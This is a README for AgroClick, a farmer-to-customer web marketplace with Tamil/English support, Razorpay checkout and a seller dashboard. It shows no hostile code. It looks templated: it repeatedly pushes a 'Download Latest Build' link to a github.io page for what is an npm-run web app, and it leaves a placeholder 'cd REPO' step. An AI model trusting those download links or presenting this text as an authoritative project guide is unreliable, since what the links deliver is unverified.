# AgroClick - Farmer-to-Customer Marketplace 2026

> **AgroClick is a responsive online marketplace for connecting agricultural sellers with customers through distance-based shop discovery, English and Tamil localization, online ordering, and Razorpay payments.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jordan-greencz5073/agroclick-farmer-hub?style=flat-square)](https://github.com/jordan-greencz5073/agroclick-farmer-hub)

---

<p align="center">
  <a href="https://jordan-greencz5073.github.io/agroclick-farmer-hub/">
    <img src="https://img.shields.io/badge/Download-AgroClick%20Latest-brightgreen?style=for-the-badge" alt="Download AgroClick">
  </a>
</p>

> **[Download AgroClick Latest Build](https://jordan-greencz5073.github.io/agroclick-farmer-hub/)**

---

[Download Latest Build](https://jordan-greencz5073.github.io/agroclick-farmer-hub/)

---

## Overview

AgroClick brings agricultural buyers and sellers together in a marketplace intended for Tamil Nadu and comparable local commerce environments. Customers can locate nearby shops by distance, inspect product listings, place items in a cart, and pay online through Razorpay.

The seller experience includes tools for maintaining product listings, inventory, orders, and customer reviews. English and Tamil language options, responsive design, OTP sign-in, shop setup, KYC support, and a keyword-driven chatbot help the platform serve users on phones, tablets, and desktop computers.

---

## Core Capabilities

- Find agricultural shops using location and distance
- Build a cart and place orders through online checkout
- Pay with Razorpay using UPI, cards, or netbanking
- Operate products, stock, orders, and reviews from the seller dashboard
- Change the interface language between English and Tamil
- Authenticate accounts with one-time-password login
- Complete KYC and establish a seller shop
- Receive keyword-based help from the integrated chatbot
- Access the responsive marketplace on mobile, tablet, or desktop
- Keep application data in a LocalStorage-based data layer

---

## Getting Started

First, download the repository and enter its folder:

```bash
git clone https://github.com/jordan-greencz5073/agroclick-farmer-hub.git
cd REPO
```

Install the required Node.js packages:

```bash
npm install
```

Run the web application with the project's configured start script:

```bash
npm start
```

Visit the local URL printed in the terminal. You can then register or use OTP sign-in to try the customer and seller journeys.

---

## How to Use AgroClick

### For customers

1. Launch AgroClick in a current web browser.
2. Select either English or Tamil.
3. Log in with OTP authentication.
4. Explore nearby shops, arranged by distance.
5. Add the products you want to the cart.
6. Proceed to Razorpay checkout and select UPI, card, or netbanking.
7. Check the order details once payment is complete.

### For sellers

1. Log in to the marketplace.
2. Finish the KYC steps.
3. Set up and configure your shop.
4. Enter products and maintain their available stock.
5. Track orders received from customers.
6. Use the seller dashboard to examine customer reviews.

---

## Configuration Notes

AgroClick stores browser-side application information through LocalStorage. For local testing, continue using the same browser profile so that the saved marketplace state remains available.

Configure payment behavior and other application settings based on the project configuration and deployment environment. Keep private service credentials out of client-side files and do not commit them to the repository.

---

## Requirements

- A modern web browser
- Node.js and npm for development on a local machine
- Network connectivity for hosted services and Razorpay checkout
- A device with a supported responsive layout, including mobile, tablet, or desktop screens
- Enabled browser LocalStorage for locally saved application data

---

## Frequently Asked Questions

### What type of users is AgroClick designed for?

The marketplace is intended for customers purchasing agricultural products and sellers who manage agricultural shops.

### Can I use AgroClick in different languages?

Yes. The interface is available in English and Tamil.

### Which payment options are supported?

Razorpay handles online payments, including UPI, card, and netbanking transactions.

### What can sellers do from their dashboard?

After completing the relevant shop setup and KYC processes, sellers can manage products, inventory, orders, and reviews.

### Where does the application save local data?

AgroClick uses LocalStorage in the browser for its client-side data layer. Removing browser storage may delete data retained locally by the application.

### What steps should I take if the app will not launch?

Make sure Node.js and npm are installed, execute `npm install`, and start the project with its configured command. For additional diagnosis, review both the terminal output and the browser console for dependency or configuration problems.

### How do I get the newest version?

Follow the latest build link above, or update the local repository with the newest changes and reinstall dependencies before running the application.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
